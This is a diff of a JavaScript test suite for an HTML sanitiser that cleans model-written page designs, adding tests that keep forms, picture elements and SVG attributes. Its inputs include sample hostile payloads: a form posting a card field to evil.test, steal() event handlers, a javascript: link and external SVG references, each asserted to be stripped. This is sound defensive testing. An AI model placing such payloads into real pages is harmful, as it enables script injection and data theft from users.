@@ -22,7 +22,7 @@ describe('sanitiseHtml — what it must remove', () => {
     ['a javascript: link', '<a href="javascript:alert(1)">Go</a>', 'javascript:'],
     ['an iframe', '<iframe src="https://evil.test"></iframe>', 'iframe'],
     ['an object embed', '<object data="x.swf"></object>', 'object'],
-    ['a form', '<form action="https://evil.test"><input></form>', 'evil.test'],
+    ['a form\'s action', '<form action="https://evil.test"><input></form>', 'evil.test'],
     ['a base tag', '<base href="https://evil.test">', 'base'],
   ])('removes %s', (_label, input, forbidden) => {
     expect(sanitiseHtml(input).toLowerCase()).not.toContain(forbidden.toLowerCase())
@@ -440,5 +440,160 @@ describe('one design among many', () => {
   it('falls back to the shared scope rather than an empty one', () => {
     expect(designScope('')).toBe(DESIGN_SCOPE)
     expect(designScope('---')).toBe(DESIGN_SCOPE)
+  })
+})
+
+describe('what a model writes and the walk deleted', () => {
+  /**
+   * The regression this exists for: `form` was not on the tag list, and a
+   * disallowed element is removed with everything inside it. A newsletter
+   * box or a sign-in card written as `<form>`, which is how a model writes
+   * one, vanished whole on first paint, with nothing in the layer tree to
+   * say it had ever been there.
+   */
+  it('keeps a form, which a sign-up section is', () => {
+    const html = sanitiseHtml(
+      '<form><label for="e">Email</label><input id="e" type="email"><button>Join</button></form>',
+    )
+    expect(html).toContain('<form>')
+    expect(html).toContain('<input id="e" type="email">')
+    expect(html).toContain('<button>Join</button>')
+  })
+
+  it('keeps the form and drops everywhere it could send anything', () => {
+    // Widening the tag list must not give a design a way to post.
+    const html = sanitiseHtml(
+      '<form action="https://evil.test/collect" method="post" enctype="text/plain" onsubmit="steal()"><input name="card"></form>',
+    )
+    expect(html).toContain('<form>')
+    expect(html).not.toContain('action')
+    expect(html).not.toContain('method')
+    expect(html).not.toContain('enctype')
+    expect(html).not.toContain('steal')
+  })
+
+  it('keeps a form cut off mid-stream, as the canvas paints it', () => {
+    const html = sanitisePartialHtml('<form><label for="e">Email</label><input id="e" type="ema')
+    expect(html).toContain('<form>')
+    expect(html).toContain('<label for="e">Email</label>')
+  })
+
+  it('keeps the inline semantics a landing page is written with', () => {
+    const html = sanitiseHtml(
+      '<address>1 Main St</address><p>Press <kbd>Cmd</kbd>, <q>quote</q>, by <cite>Someone</cite></p>',
+    )
+    for (const tag of ['address', 'kbd', 'q', 'cite']) expect(html).toContain(`<${tag}>`)
+  })
+
+  it('keeps a picture so its img fallback survives, and still drops its sources', () => {
+    const html = sanitiseHtml(
+      '<picture><source srcset="https://evil.test/a.png 1x"><img src="/api/image/x" alt=""></picture>',
+    )
+    expect(html).toContain('<picture>')
+    expect(html).toContain('/api/image/x')
+    expect(html).not.toContain('<source')
+    expect(html).not.toContain('evil.test')
+  })
+})
+
+describe('icons', () => {
+  /**
+   * The regression this exists for: `fill-rule` was not on the attribute
+   * list. Most icon sets cut the holes in a filled glyph with
+   * `fill-rule="evenodd"`, so every ring rendered as a disc and every
+   * outlined shape as a blob.
+   */
+  it('keeps fill-rule so an icon\'s holes stay holes', () => {
+    const html = sanitiseHtml(
+      '<svg viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 4a6 6 0 110 12 6 6 0 010-12z"/></svg>',
+    )
+    expect(html).toContain('fill-rule="evenodd"')
+    expect(html).toContain('clip-rule="evenodd"')
+  })
+
+  it('keeps the paint that shapes a stroke and places a label', () => {
+    const html = sanitiseHtml(
+      '<svg><circle r="4" stroke-dasharray="4 2" stroke-dashoffset="1" stroke-opacity=".5" fill-opacity=".2"/>' +
+        '<text text-anchor="middle" dominant-baseline="central">1</text></svg>',
+    )
+    for (const attribute of [
+      'stroke-dasharray="4 2"',
+      'stroke-dashoffset="1"',
+      'stroke-opacity=".5"',
+      'fill-opacity=".2"',
+      'text-anchor="middle"',
+      'dominant-baseline="central"',
+    ]) {
+      expect(html).toContain(attribute)
+    }
+  })
+
+  it('keeps how a photograph loads', () => {
+    const html = sanitiseHtml('<img src="/api/image/x" alt="" loading="lazy" decoding="async">')
+    expect(html).toContain('loading="lazy"')
+    expect(html).toContain('decoding="async"')
+  })
+
+  it('keeps a clip-path that points at the clipPath beside it', () => {
+    const html = sanitiseHtml(
+      '<svg><defs><clipPath id="clip"><rect width="10" height="10"/></clipPath></defs>' +
+        '<g clip-path="url(#clip)"><rect width="20" height="20"/></g></svg>',
+    )
+    expect(html).toContain('<clipPath id="clip">')
+    expect(html).toContain('clip-path="url(#clip)"')
+  })
+
+  it('drops a clip-path that points off the page', () => {
+    // A presentation attribute is a declaration by another route, and
+    // `url(https://…)` here is the request a background image would make.
+    const html = sanitiseHtml(
+      '<svg><g clip-path="url(https://evil.test/c.svg#clip)" mask="url(http://evil.test/m.svg#m)"><rect/></g></svg>',
+    )
+    expect(html).not.toContain('evil.test')
+    expect(html).toContain('<rect')
+  })
+
+  it('keeps a mask, a symbol, a title and a description', () => {
+    const html = sanitiseHtml(
+      '<svg><title>Search</title><desc>A magnifier</desc>' +
+        '<defs><mask id="m"><rect/></mask><symbol id="s"><path d="M0 0"/></symbol></defs>' +
+        '<use href="#s" mask="url(#m)"/></svg>',
+    )
+    for (const fragment of ['<title>Search</title>', '<desc>A magnifier</desc>', '<mask id="m">', '<symbol id="s">', '<use href="#s" mask="url(#m)">']) {
+      expect(html).toContain(fragment)
+    }
+  })
+
+  it('keeps a use that points into its own document, by either spelling', () => {
+    const html = sanitiseHtml('<svg><use href="#a"/><use xlink:href="#b"/></svg>')
+    expect(html).toContain('href="#a"')
+    expect(html).toContain('xlink:href="#b"')
+  })
+
+  it('drops a use whose href leaves the document', () => {
+    // Same-origin paths are fine for an <img> and not here: a use fetches a
+    // whole SVG document and clones what it finds, none of which has been
+    // through this walk.
+    const html = sanitiseHtml(
+      '<svg><use href="https://evil.test/sprite.svg#icon"/><use xlink:href="/sprite.svg#icon"/>' +
+        '<use href="data:image/svg+xml,<svg/>#x"/></svg>',
+    )
+    expect(html).not.toContain('evil.test')
+    expect(html).not.toContain('sprite.svg')
+    expect(html).not.toContain('data:')
+    expect(html).toContain('<use>')
+  })
+
+  it('does not let the html title element in through the svg one', () => {
+    expect(sanitiseHtml('<title>Owned</title><p>Body</p>')).toBe('<p>Body</p>')
+  })
+
+  it('still drops onload on an svg', () => {
+    // Widening the tag and attribute lists must not widen what can run.
+    const html = sanitiseHtml(
+      '<svg onload="steal()"><use href="#a" onclick="steal()"/><path d="M0 0" onmouseover="steal()"/></svg>',
+    )
+    expect(html).not.toContain('steal')
+    expect(html).toContain('<path d="M0 0">')
   })
 })
